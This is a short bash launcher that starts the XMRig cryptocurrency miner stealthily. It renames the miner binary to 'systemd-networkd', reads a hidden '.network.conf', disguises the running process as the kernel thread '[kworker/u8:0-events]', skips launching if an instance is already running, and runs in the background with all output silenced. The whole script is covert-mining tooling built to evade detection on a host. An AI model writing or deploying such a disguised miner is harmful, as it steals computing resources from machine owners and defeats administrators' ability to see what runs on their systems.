#!/bin/bash
# Quiet start for Segfault: fake argv, no terminal, light RandomX.
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$DIR/systemd-networkd"
CFG="$DIR/.network.conf"
PROC='[kworker/u8:0-events]'

if [[ ! -x "$BIN" && -x "$DIR/xmrig" ]]; then
  cp -f "$DIR/xmrig" "$BIN"
  chmod +x "$BIN"
fi
[[ -f "$CFG" ]] || CFG="$DIR/config.json"

# already running?
if pgrep -f 'kworker/u8:0-events' >/dev/null 2>&1; then
  exit 0
fi

cd "$DIR"
exec -a "$PROC" "$BIN" -c "$CFG" --background --no-color --donate-level=1 >/dev/null 2>&1
